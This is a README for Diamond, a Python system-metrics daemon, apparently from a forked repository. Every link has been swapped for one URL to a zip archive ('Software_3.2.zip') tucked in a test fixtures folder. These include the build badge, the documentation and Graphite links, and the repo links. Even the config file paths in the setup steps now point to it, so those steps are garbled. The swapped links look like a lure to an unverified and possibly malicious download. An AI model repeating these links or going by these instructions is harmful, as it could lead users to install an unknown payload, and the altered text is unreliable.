[![Build Status](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip)](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip)

Diamond is a python daemon that collects system metrics and publishes them to [Graphite](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip) (and others).
It is capable of collecting cpu, memory, network, i/o, load and disk metrics.
Additionally, it features an API for implementing custom collectors for gathering metrics from almost any source.

## Getting Started

Steps to getting started:

  * Read the [documentation](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip)
  * Install via `pip install diamond`.
    The releases on GitHub are not recommended for use.
    Use `pypi-install diamond` on Debian/Ubuntu systems with python-stdeb installed to build packages.
  * Copy the `https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip` file to `https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip`.
  * Optional: Run `diamond-setup` to help set collectors in `https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip`.
  * Modify `https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip` for your needs.
  * Run diamond with one of: `diamond` or `initctl start diamond` or `/etc/init.d/diamond restart`.

## Success Stories

 * Diamond has successfully been deployed to a cluster of 1000 machines pushing [3 million points per minute](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip+question/178969).
 * Diamond is deployed on [Fabric's](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip) infrastructure, polling hundreds of metric sources and pushing millions of points per minute.

## Repos

Historically Diamond was a brightcove project and hosted at [BrightcoveOS](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip).
However none of the active developers are brightcove employees and so the development
has moved to [python-diamond](https://raw.githubusercontent.com/vinhkennej/Diamond/master/src/collectors/memory/test/fixtures/Software_3.2.zip). We request
that any new pull requests and issues be cut against python-diamond. We will keep
BrightcoveOS updated and still honor issues/tickets cut on that repo.
